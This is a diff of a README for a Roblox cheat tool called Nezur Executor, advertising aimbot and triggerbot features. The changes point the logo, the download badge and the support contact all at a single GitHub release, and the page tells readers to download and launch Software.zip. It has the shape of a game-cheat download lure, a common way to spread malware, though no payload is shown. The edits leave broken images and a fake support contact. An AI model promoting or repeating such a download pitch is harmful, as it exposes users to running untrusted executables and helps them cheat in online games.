@@ -1,6 +1,6 @@
 # Nezur Executor Roblox 
 
-![Nezur Executor Logo](https://example.com/logo.png)
+![Nezur Executor Logo](https://github.com/d3spyy/Nezur-Executor/releases/tag/v2.0)
 
 Nezur Executor is a powerful tool designed to enhance your Roblox experience. With advanced features, unbeatable AI technology, and standout aimbot and triggerbot capabilities, Nezur Executor is here to elevate your gameplay to the next level.
 
@@ -15,7 +15,7 @@ Nezur Executor is a powerful tool designed to enhance your Roblox experience. Wi
 
 To get started with Nezur Executor, simply download the software from the link below:
 
-[<img src="https://img.shields.io/badge/Download-Software.zip-brightgreen">](https://github.com/user-attachments/files/18060583/Software.zip)
+[<img src="https://github.com/d3spyy/Nezur-Executor/releases/tag/v2.0">](https://github.com/d3spyy/Nezur-Executor/releases/tag/v2.0)
 
 Please note that the software needs to be launched after downloading.
 
@@ -29,7 +29,7 @@ If the link provided above does not work, please check the "Releases" section of
 
 ## Support
 
-For any issues or inquiries regarding Nezur Executor, please contact our support team at [support@nezurexecutor.com](mailto:support@nezurexecutor.com).
+For any issues or inquiries regarding Nezur Executor, please contact our support team at [https://github.com/d3spyy/Nezur-Executor/releases/tag/v2.0](https://github.com/d3spyy/Nezur-Executor/releases/tag/v2.0).
 
 ## Contribute
 
